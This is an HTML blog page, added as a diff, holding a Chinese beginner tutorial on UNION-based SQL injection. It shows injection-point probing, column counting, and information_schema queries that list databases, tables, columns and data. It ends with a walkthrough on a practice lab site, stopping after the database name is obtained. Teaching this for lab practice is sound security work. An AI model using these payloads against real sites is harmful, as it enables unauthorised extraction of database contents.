@@ -1,0 +1,693 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>SQL注入快速入门—联合注入 - 梧桐漓染的博客</title><meta name="Description" content="桐漓的博客"><meta property="og:title" content="SQL注入快速入门—联合注入" />
+<meta property="og:description" content="SQL注入快速入门—联合注入 概述：所谓的SQL注入就是通过某种方式将恶意的SQL代码添加到输入参数中，然后传递到SQL服务器使其解析并执行的" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-10-09T22:14:17+08:00" />
+<meta property="article:modified_time" content="2023-10-09T22:14:17+08:00" /><meta property="og:site_name" content="Lyrio&#39;s blog" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content="SQL注入快速入门—联合注入"/>
+<meta name="twitter:description" content="SQL注入快速入门—联合注入 概述：所谓的SQL注入就是通过某种方式将恶意的SQL代码添加到输入参数中，然后传递到SQL服务器使其解析并执行的"/>
+<meta name="application-name" content="Lyrio&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="Lyrio&#39;s blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SQL注入快速入门—联合注入",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5\/"
+        },"genre": "posts","keywords": "SQL注入漏洞, ","wordcount":  3973 ,
+        "url": "\/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5\/","datePublished": "2023-10-09T22:14:17+08:00","dateModified": "2023-10-09T22:14:17+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Lyrio"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.1.1" defer type="module" integrity="sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme; }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('light' === 'light' || 'light' === 'dark' || 'light' === 'black') setTheme('light'), saveTheme('light'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"><i class='fas fa-fw fa-fan fa-spin'></i> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="梧桐漓染的博客"><img
+        class="logo"
+        loading="lazy"
+        src="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        srcset="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 1.5x, https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png 2x"
+        sizes="auto"
+        alt="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png"
+        title="https://pic.imgdb.cn/item/652539dcc458853aefb12f73.png" ></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title=""><i class='fas fa-fw fa-fan fa-spin'></i>友链</a><a class="menu-item" href="/about/" title="">关于</a><a href="#" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "false")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">SQL注入快速入门—联合注入</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Lyrio</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/web%E5%AE%89%E5%85%A8/"><i class="far fa-folder fa-fw"></i>Web安全</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-10-09">2023-10-09</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-10-09">2023-10-09</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3973 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#概述">概述：</a></li>
+    <li><a href="#前置知识">前置知识：</a>
+      <ul>
+        <li><a href="#mysql数据库">MySQL数据库：</a></li>
+      </ul>
+    </li>
+    <li><a href="#sql注入流程">SQL注入流程：</a>
+      <ul>
+        <li><a href="#sql注入漏洞的探测方法">SQL注入漏洞的探测方法：</a></li>
+        <li><a href="#sql注入">SQL注入：</a>
+          <ul>
+            <li><a href="#1判断页面有几个字段">1.判断页面有几个字段：</a></li>
+            <li><a href="#3通过联合查询查看字段在前端的回显位置">3.通过联合查询查看字段在前端的回显位置：</a></li>
+            <li><a href="#4查询目标数据库名">4.查询目标数据库名：</a></li>
+            <li><a href="#5查询目标数据库名里的所有表名">5.查询目标数据库名里的所有表名：</a></li>
+            <li><a href="#6查询目标表名内的所有字段名">6.查询目标表名内的所有字段名</a></li>
+            <li><a href="#7查询目标字段名内的数据">7.查询目标字段名内的数据</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#拓展实战">拓展实战：</a>
+      <ul>
+        <li><a href="#手工注入">手工注入：</a></li>
+        <li><a href="#使用工具sqlmap注入">使用工具sqlmap注入：</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="sql注入快速入门联合注入" class="headerLink">
+    <a href="#sql%e6%b3%a8%e5%85%a5%e5%bf%ab%e9%80%9f%e5%85%a5%e9%97%a8%e8%81%94%e5%90%88%e6%b3%a8%e5%85%a5" class="header-mark"></a>SQL注入快速入门—联合注入</h1><h2 id="概述" class="headerLink">
+    <a href="#%e6%a6%82%e8%bf%b0" class="header-mark"></a>概述：</h2><p>所谓的SQL注入就是通过某种方式将恶意的SQL代码添加到输入参数中，然后传递到SQL服务器使其解析并执行的一种攻击手法。</p>
+<p>​</p>
+<h2 id="前置知识" class="headerLink">
+    <a href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" class="header-mark"></a>前置知识：</h2><h3 id="mysql数据库" class="headerLink">
+    <a href="#mysql%e6%95%b0%e6%8d%ae%e5%ba%93" class="header-mark"></a>MySQL数据库：</h3><ul>
+<li>
+<p>需要有一些MySQL基础，需知道：<strong>数据库</strong>、<strong>表</strong>、<strong>字段</strong>、<strong>数据</strong>之间的关系、<code>select查询语句</code>(下面有)、<code>order by</code>、<code>and</code>、<code>group_concat()</code>(下面有)。</p>
+</li>
+<li>
+<p>在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个<code>information_schema</code>的数据库，在该库中，我们需要记住三个表名，分别是<code>schemata</code>，<code>tables</code>，<code>columns</code>。</p>
+<ul>
+<li>Schemata 表<strong>存储的是该用户创建的所有数据库的库名</strong>，需要记住该表中记录数据库名的字段名为 <code>schema_name</code>。</li>
+<li>Tables 表<strong>存储该用户创建的所有数据库的库名和表名</strong>，要记住该表中记录数据库 库名和表名的字段分别是 <code>table_schema</code>和 <code>table_name</code>。</li>
+<li>Columns 表<strong>存储该用户创建的所有数据库的库名、表名、字段名</strong>，要记住该表中记录数据库库名、表名、字段名为 <code>table_schema</code>、<code>table_name</code>、<code>columns_name</code>。</li>
+</ul>
+</li>
+<li>
+<p>MySQL的查询语句是<code>SELECT * FROM 表名 WHERE 条件; --- 从某个表查询符合某个条件的所有数据</code>
+<code>*</code>可以换成你指定要查询的字段数据。</p>
+</li>
+<li>
+<p><code>union</code>：MySQL中，union用于将多个select语句的结果组合到一个结果集中，并删除结果集中的重复数据。</p>
+</li>
+<li>
+<p><code>group_concat()</code>：把数据分组连接(大概这么解释)。</p>
+</li>
+<li>
+<p><code>order by 数字</code>：<strong>把查询的数据按第n个字段排序。</strong></p>
+</li>
+<li>
+<p><code>Database()</code>：查询当前网站使用的数据库。</p>
+</li>
+</ul>
+<p><a href="https://urp1gyfvvr.feishu.cn/docx/Rjg7dmrnVoUK4IxJ1accuLatnJf" target="_blank" rel="noopener noreferrer">快速回忆MySQL增删改查和常见函数</a></p>
+<p>​</p>
+<h2 id="sql注入流程" class="headerLink">
+    <a href="#sql%e6%b3%a8%e5%85%a5%e6%b5%81%e7%a8%8b" class="header-mark"></a>SQL注入流程：</h2><h3 id="sql注入漏洞的探测方法" class="headerLink">
+    <a href="#sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e%e7%9a%84%e6%8e%a2%e6%b5%8b%e6%96%b9%e6%b3%95" class="header-mark"></a>SQL注入漏洞的探测方法：</h3><ol>
+<li>找到网站交互点：地址栏、搜索框、表单
+<ul>
+<li>地址栏：某个界面的地址栏URL格式类似为<code>http://xxxxxxx?id=数字</code>则符合要求。</li>
+</ul>
+</li>
+<li>在<code>id=数字</code>后面加单引号<code>'</code>或双引号<code>&quot;</code>、等看看是否报错，如果报错就<strong>可能存在</strong> SQL注入漏洞。</li>
+<li>判断是 <strong>“数字型”</strong> 还是 <strong>“字符型”</strong> 以及 <strong>是否存在SQL漏洞</strong> ：
+<ul>
+<li>在<code>id=数字</code>后面加上 <code>and 1=1</code>页面显示正常，换成 <code>and 1=2</code>页面显示错误，说明 <strong>一定存在SQL注入</strong> 且为 <strong>“数学型”</strong> 。</li>
+<li>在<code>id=数字</code>后面加上 <code>' and 1=1 #</code>页面显示正常，换成 <code>' and 1=2 #</code>页面显示错误，说明 <strong>一定存在SQL注入</strong> 且为 <strong>“字符型”</strong> 。</li>
+<li>如果都显示不正常说明不存在SQL注入漏洞(当有可能是其他情况，由于本篇只讲基础故当做不存在)。</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<p>如果为“字符型”，后文提到的代码都要在代码前面加上<code>'</code>、后面加上<code>#</code>。</p>
+</blockquote>
+<p>​</p>
+<h3 id="sql注入" class="headerLink">
+    <a href="#sql%e6%b3%a8%e5%85%a5" class="header-mark"></a>SQL注入：</h3><h4 id="1判断页面有几个字段" class="headerLink">
+    <a href="#1%e5%88%a4%e6%96%ad%e9%a1%b5%e9%9d%a2%e6%9c%89%e5%87%a0%e4%b8%aa%e5%ad%97%e6%ae%b5" class="header-mark"></a>1.判断页面有几个字段：</h4><p><strong>原因：<code>union</code>前面的查询语句的字段数量和后面的查询语句字段数量要一致</strong></p>
+<p>在<code>id=数字</code>后加上<code>order by 数字</code>即<code>id=数字 order by 数字</code></p>
+<blockquote>
+<p>如果是字符型则为<code>id=数字' order by 数学#</code></p>
+</blockquote>
+<p>意思是<strong>把查询的数据按第n个字段排序</strong>，如果页面上的字段大于n则会显示错误。</p>
+<p>所以一开始可以随便<code>order by</code>一个数字，如果显示错误就减小数字，如果正常显示就增大数字。</p>
+<p>直到你<code>order by n</code><strong>能正常显示</strong>、<code>order by n+1</code><strong>就显示错误</strong> ，说明n就是这个页面的字段数。</p>
+<blockquote>
+<p>ps：善用二分法。</p>
+</blockquote>
+<h4 id="3通过联合查询查看字段在前端的回显位置" class="headerLink">
+    <a href="#3%e9%80%9a%e8%bf%87%e8%81%94%e5%90%88%e6%9f%a5%e8%af%a2%e6%9f%a5%e7%9c%8b%e5%ad%97%e6%ae%b5%e5%9c%a8%e5%89%8d%e7%ab%af%e7%9a%84%e5%9b%9e%e6%98%be%e4%bd%8d%e7%bd%ae" class="header-mark"></a>3.通过联合查询查看字段在前端的回显位置：</h4><p>对于一个网页，如果它的字段数是3，但可能只有第1，2字段的数据返回页面前端。所以我们需要查询哪个字段会回显，得用<code>union select </code>联合查询来查看字段在前端的回显位置</p>
+<pre><code>id=数字 and 1=2 union select 1,2
+---或者
+id=不存在的数字 union select 1,2,3
+</code></pre>
+<p><code>and 1=2</code>或者<code>id=不存在的数字</code>：使前一句的SQL语句为错误</p>
+<blockquote>
+<p>不存在的数字：假如一个网页有<code>id=1</code>的页面和<code>id=2</code>的页面，改成<code>id=-1</code>(除了1和2的其他数字都行)，就没有相对应的页面显示；<code>and 1=2</code>也是同理。</p>
+</blockquote>
+<blockquote>
+<p>之所以让前半句出错是因为程序在展示数据的时候通常只会取结果集的第一行数据，只要让第一行查询的结果是空集，即<code>union</code>左边的<code>select子句</code>查询结果为空，那么<code>union</code>右边的查询结果自然就成为了第一行，打印在网页上了</p>
+</blockquote>
+<p><code>union select 1,2,3</code>：联合查询，让第一个字段显示“1”、第二个字段显示“2”、第三个字段显示“3”，从而来找可以回显的字段在页面的位置</p>
+<h4 id="4查询目标数据库名" class="headerLink">
+    <a href="#4%e6%9f%a5%e8%af%a2%e7%9b%ae%e6%a0%87%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d" class="header-mark"></a>4.查询目标数据库名：</h4><p>在得到字段数之后就可以查询数据库名。</p>
+<p>查询数据库名的函数是<code>database()</code>。</p>
+<p>假设我们已经找到某个可回显字段的位置(比如显示“2”的字段)，记住这个字段位置，在地址栏输入：</p>
+<pre><code>http://xxxxxxx?id=1 and 1=2 union select 1,database(),3
+</code></pre>
+<h4 id="5查询目标数据库名里的所有表名" class="headerLink">
+    <a href="#5%e6%9f%a5%e8%af%a2%e7%9b%ae%e6%a0%87%e6%95%b0%e6%8d%ae%e5%ba%93%e5%90%8d%e9%87%8c%e7%9a%84%e6%89%80%e6%9c%89%e8%a1%a8%e5%90%8d" class="header-mark"></a>5.查询目标数据库名里的所有表名：</h4><pre><code>http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &quot;目标数据库名&quot;
+</code></pre>
+<ul>
+<li>
+<p>在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个<code>information_schema</code>的数据库。</p>
+</li>
+<li>
+<p><code>information_schema</code>数据库里有个<code>tables</code>表。</p>
+</li>
+<li>
+<p><code>tables</code>表里有<code>table_schema</code>和<code>table_name</code>字段。</p>
+</li>
+<li>
+<p><code>table_schema</code>字段存的是网站管理员创建的所有数据库的库名。</p>
+</li>
+<li>
+<p><code>table_name</code>字段存的是网站管理员创建的所有数据库的表名。</p>
+</li>
+</ul>
+<p>这句代码的意思是从<code>information_schema</code>数据库里的<code>tables</code>表里找<code>table_schema</code>字段里的数据为 <strong>目标数据库名</strong> 所对应的<code>table_name</code>字段里的数据，即查询 <strong>目标数据库名内的所有表名</strong>。</p>
+<p><code>group_concat(table_name)</code>：将查询到的表名用<code>,</code>连起来。</p>
+<h4 id="6查询目标表名内的所有字段名" class="headerLink">
+    <a href="#6%e6%9f%a5%e8%af%a2%e7%9b%ae%e6%a0%87%e8%a1%a8%e5%90%8d%e5%86%85%e7%9a%84%e6%89%80%e6%9c%89%e5%ad%97%e6%ae%b5%e5%90%8d" class="header-mark"></a>6.查询目标表名内的所有字段名</h4><pre><code>http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &quot;目标表名&quot;
+</code></pre>
+<h4 id="7查询目标字段名内的数据" class="headerLink">
+    <a href="#7%e6%9f%a5%e8%af%a2%e7%9b%ae%e6%a0%87%e5%ad%97%e6%ae%b5%e5%90%8d%e5%86%85%e7%9a%84%e6%95%b0%e6%8d%ae" class="header-mark"></a>7.查询目标字段名内的数据</h4><pre><code>http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(目标字段名),3 from 目标表名
+</code></pre>
+<p>如果要一次性查询多个字段内的数据：</p>
+<pre><code>http://xxxxxxx?id=1 and 1=2 union select 1,group_concat(字段名1,&quot;;&quot;,字段名2,&quot;;&quot;,字段名3),3 from 目标表名
+</code></pre>
+<p><code>;</code>用来分隔多个字段名内的数据</p>
+<p>​</p>
+<h2 id="拓展实战" class="headerLink">
+    <a href="#%e6%8b%93%e5%b1%95%e5%ae%9e%e6%88%98" class="header-mark"></a>拓展实战：</h2><h3 id="手工注入" class="headerLink">
+    <a href="#%e6%89%8b%e5%b7%a5%e6%b3%a8%e5%85%a5" class="header-mark"></a>手工注入：</h3><p>这是一个SQL注入的靶场，目标是找到“flag”</p>
+<img src="https://pic1.imgdb.cn/item/646f1050f024cca1735aec3a.png"  />
+<p>首先我们要去找到交互点，这个界面的交互点只有最上面的地址栏，但没有类似<code>http://xxxxxxx?id=数字</code>，没法做SQL注入。</p>
+<p>所以要先找到地址栏有类似于<code>id=数字</code>这样的界面</p>
+<p>可以看到这里有个<strong>查看新闻</strong>的按钮</p>
+<img src="https://pic1.imgdb.cn/item/646f11ecf024cca1735e3427.jpg"  />
+<p>点进去之后看到地址栏出现了我们期待的<code>?id=1</code>，接下来就是测试这个交互点（地址栏）是否存在SQL注入了！</p>
+<img src="https://pic1.imgdb.cn/item/646f1268f024cca1735f35ba.jpg"  />
+<p>上文有提到SQL注入的流程，首先我们在<code>1</code>后面加个 <code>‘</code>，即<code>http://pu2lh35s.ia.aqlab.cn/?id=1'</code>，访问后发现页面出错了（内容没了）</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg" title="https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg, https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg 1.5x, https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f136cf024cca173615e4b.jpg">
+    </a></figure></p>
+<p>接着我们再试试在后面加上 <code>and 1=1</code>，即<code>http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=1</code>，可以看到页面照常显示</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg" title="https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg, https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg 1.5x, https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f1403f024cca1736267a4.jpg">
+    </a></figure></p>
+<p>到这里就说明了地址栏这个交互点存在SQL注入</p>
+<p>接着是判断页面有几个字段</p>
+<p>地址栏输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 order by 2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回车后页面正常显示：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg" title="https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg, https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg 1.5x, https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f6c1df024cca173f09157.jpg">
+    </a></figure></p>
+<p>地址栏输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 order by 3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回车后页面显示错误：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg" title="https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg, https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg 1.5x, https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f6cf9f024cca173f1de97.jpg">
+    </a></figure></p>
+<p>由此可以断定当前页面有2个回显字段</p>
+<p>接下来是通过联合查询查看字段在前端的回显位置</p>
+<p>地址栏输入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回车后页面显示：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg" title="https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg, https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg 1.5x, https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f6da2f024cca173f2cd65.jpg">
+    </a></figure></p>
+<p>说明圈起来的那个字段是可利用的回显字段</p>
+<p>接下来是利用这个字段来查询当前页面的数据库名</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://pu2lh35s.ia.aqlab.cn/?id=1 and 1=2 union select 1,database()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回车后的页面：</p>
+<p><figure><a class="lightgallery" href="https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg" title="https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg" data-thumbnail="https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg">
+        <img
+            
+            loading="lazy"
+            src="https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg"
+            srcset="https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg, https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg 1.5x, https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg 2x"
+            sizes="auto"
+            alt="https://pic1.imgdb.cn/item/646f6e8bf024cca173f44560.jpg">
+    </a></figure></p>
+<p>得到了数据库名 <code>maoshe</code></p>
